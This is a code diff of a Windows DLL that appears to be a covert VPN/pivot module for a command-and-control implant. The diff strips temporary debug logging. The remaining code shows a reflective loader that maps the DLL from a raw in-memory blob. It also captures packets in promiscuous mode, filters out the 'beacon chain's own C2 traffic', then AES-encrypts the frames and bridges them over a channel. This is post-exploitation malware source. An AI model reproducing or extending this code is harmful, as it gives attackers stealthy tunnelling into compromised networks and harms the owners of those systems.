@@ -47,32 +47,6 @@
 #define DRV_NDISPROT  2  /* Manual: self-built signed driver (L2 direct I/O) */
 #define DRV_WINDIVERT 3  /* Manual: always use WinDivert (L3 direct I/O) */
 
-/* TEMP DIAGNOSTIC: stage markers (remove after e2e is green) */
-static void vpn_dbg(const char *msg)
-{
-    HANDLE f = CreateFileA("C:\\Users\\Public\\vpn_dbg.txt", FILE_APPEND_DATA, 0, NULL,
-                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (f == INVALID_HANDLE_VALUE) return;
-    DWORD w;
-    WriteFile(f, msg, lstrlenA(msg), &w, NULL);
-    WriteFile(f, "\r\n", 2, &w, NULL);
-    CloseHandle(f);
-}
-
-static void vpn_dbg_n(const char *msg, int v)
-{
-    char buf[96];
-    int i = 0;
-    while (*msg && i < 80) buf[i++] = *msg++;
-    if (v < 0) { buf[i++] = '-'; v = -v; }
-    { char num[12]; int n = 0; int t = v;
-      if (t == 0) num[n++] = '0';
-      while (t) { num[n++] = (char)('0' + (t % 10)); t /= 10; }
-      while (n) buf[i++] = num[--n]; }
-    buf[i] = 0;
-    vpn_dbg(buf);
-}
-
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -326,14 +300,11 @@ vpn_npcap_open(void)
         }
     }
 
-    if (!dev) { vpn_dbg("npcap: no device found"); return -1; }
-    vpn_dbg("npcap dev:");
-    vpn_dbg(dev);
+    if (!dev) return -1;
 
     /* Open the device via pcap API: promiscuous, 1s read timeout */
     g_pcap_handle = p_pcap_open_live(dev, 65535, 1, 1000, errbuf);
-    if (!g_pcap_handle) { vpn_dbg("pcap_open_live FAIL"); vpn_dbg(errbuf); return -1; }
-    vpn_dbg("pcap_open_live ok");
+    if (!g_pcap_handle) return -1;
 
     g_active_backend = 0;  /* Npcap */
     return 0;
@@ -536,45 +507,9 @@ vpn_read_frame(HANDLE fd, unsigned char *buf, int len)
          * dropped excluded traffic if a filter was set) */
         void *hdr = NULL, *pkt = NULL;
         int ret = p_pcap_next_ex(g_pcap_handle, &hdr, &pkt);
-        if (ret != 1 || !pkt) {
-            { static int ticks = 0;
-              if ((++ticks & 0x7F) == 0) vpn_dbg_n("pcap idle ticks=", ticks); }
-            return -1;
-        }
-        /* pcap_pkthdr: {ts(8B); caplen(4B); len(4B)} → caplen at offset 8 */
+        if (ret != 1 || !pkt) return -1;
+        /* pcap_pkthdr: {ts(8B); caplen(4B); len(4B)} - caplen at offset 8 */
         int caplen = *(int *)((char *)hdr + 8);
-        {
-            /* TEMP: log every delivered frame: len, dst[0], ethertype */
-            unsigned char *pp = (unsigned char *)pkt;
-            char msg[80];
-            int i = 0;
-            const char *hex = "0123456789abcdef";
-            const char *pre = "PKT ";
-            while (*pre) msg[i++] = *pre++;
-            { int v = caplen; char num[8]; int n = 0;
-              if (v == 0) num[n++] = '0';
-              while (v) { num[n++] = hex[v % 10]; v /= 10; }
-              while (n) msg[i++] = num[--n]; }
-            msg[i++] = ' ';
-            msg[i++] = 'd';
-            msg[i++] = 's';
-            msg[i++] = 't';
-            msg[i++] = '=';
-            for (int q = 0; q < 6 && i < 70; q++) {
-                msg[i++] = hex[pp[q] >> 4];
-                msg[i++] = hex[pp[q] & 0xF];
-            }
-            msg[i++] = ' ';
-            msg[i++] = 'e';
-            msg[i++] = 't';
-            msg[i++] = '=';
-            msg[i++] = hex[pp[12] >> 4];
-            msg[i++] = hex[pp[12] & 0xF];
-            msg[i++] = hex[pp[13] >> 4];
-            msg[i++] = hex[pp[13] & 0xF];
-            msg[i] = 0;
-            vpn_dbg(msg);
-        }
         if (caplen > len) caplen = len;
         memcpy(buf, pkt, caplen);
         return caplen;
@@ -771,10 +706,7 @@ vpn_set_filter(HANDLE fd)
         struct bpf_program_kernel prog;
         prog.bf_len   = g_bpf_prog_len;
         prog.bf_insns = g_bpf_insns;
-        { int rc = p_pcap_setfilter(g_pcap_handle, &prog);
-          vpn_dbg_n("pcap_setfilter rc=", rc);
-          vpn_dbg_n("prog_len=", (int)g_bpf_prog_len);
-          return rc == 0 ? 0 : -1; }
+        return p_pcap_setfilter(g_pcap_handle, &prog) == 0 ? 0 : -1;
     }
 
     /* WinDivert: no kernel hook — vpn_read_frame runs bpf_run() in user
@@ -1212,29 +1144,23 @@ vpn_main_loop(LPVOID param)
      * holds it -> torn-down module + CRT crashes (seen as nondeterministic
      * lock xadd [rcx+15Ch] faults right after deploy). */
     Sleep(500);
-    vpn_dbg("main_loop: start");
     /* Ensure we have a kernel driver for frame I/O */
-    if (vpn_ensure_driver() != 0) { vpn_dbg("FAIL ensure_driver"); return 1; }
-    vpn_dbg("ok ensure_driver");
+    if (vpn_ensure_driver() != 0) return 1;
 
     /* Open the packet device (Npcap L2 or WinDivert L3 per driver_mode) */
     adapter_fd = vpn_open_packet_device();
-    if (adapter_fd == INVALID_HANDLE_VALUE) { vpn_dbg("FAIL open_device"); return 1; }
-    vpn_dbg("ok open_device");
+    if (adapter_fd == INVALID_HANDLE_VALUE) return 1;
 
     /* Unpack and apply the pre-compiled BPF filter (loop prevention:
      * excludes the beacon chain's own C2 traffic) */
     bpf_load_from_config();
     vpn_set_filter(adapter_fd);
-    vpn_dbg("ok bpf");
 
     /* Initialize AES */
-    if (vpn_aes_init() != 0) { vpn_dbg("FAIL aes"); vpn_close_device(adapter_fd); return 1; }
-    vpn_dbg("ok aes");
+    if (vpn_aes_init() != 0) { vpn_close_device(adapter_fd); return 1; }
 
     /* Connect the channel */
-    if (channel_init() != 0) { vpn_dbg("FAIL channel_init"); vpn_close_device(adapter_fd); return 1; }
-    vpn_dbg("ok channel_init - VPN LOOP RUNNING");
+    if (channel_init() != 0) { vpn_close_device(adapter_fd); return 1; }
 
     /* Main loop: bridge device <-> channel */
     for (;;) {
@@ -1259,14 +1185,9 @@ vpn_main_loop(LPVOID param)
          * [u16 + 'A' pad] the crypto layer prepends/appends) */
         len = vpn_read_frame(adapter_fd, frame_buf, sizeof(frame_buf));
         if (len > 0) {
-            vpn_dbg_n("GOTFRAME len=", len);
             enc_len = vpn_aes_encrypt(channel_buf, frame_buf, len);
             if (enc_len > 0) {
-                { int sr = channel_send(channel_buf, enc_len);
-                  if (sr < 0) vpn_dbg_n("SENDFAIL r=", sr);
-                  else vpn_dbg_n("SENT blob=", enc_len); }
-            } else {
-                vpn_dbg_n("ENCRYPTFAIL r=", enc_len);
+                channel_send(channel_buf, enc_len);
             }
         }
     }
@@ -1559,9 +1480,8 @@ ReflectiveLoader(LPVOID param)
         entry = rl_resolve(newbase, hDM);
         if (!entry) entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
     }
-    /* NOTE: no vpn_dbg here - the loader runs from the raw blob where
-     * rip-relative string literals are invalid; markers only run in the
-     * mapped image below. */
+    /* NOTE: the loader runs from the raw blob where rip-relative string
+     * literals are invalid - it must not reference .rdata data at all. */
     ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
         (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
 
@@ -1584,11 +1504,9 @@ DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
 
     switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
-        vpn_dbg("DllMain: PROCESS_ATTACH");
         DisableThreadLibraryCalls(hinstDLL);
         /* Start VPN in a separate thread — DllMain must return quickly */
         thread = CreateThread(NULL, 0, vpn_main_loop, NULL, 0, NULL);
-        vpn_dbg(thread ? "DllMain: thread created" : "DllMain: CreateThread FAILED");
         if (thread) CloseHandle(thread);
         break;
     case DLL_PROCESS_DETACH:
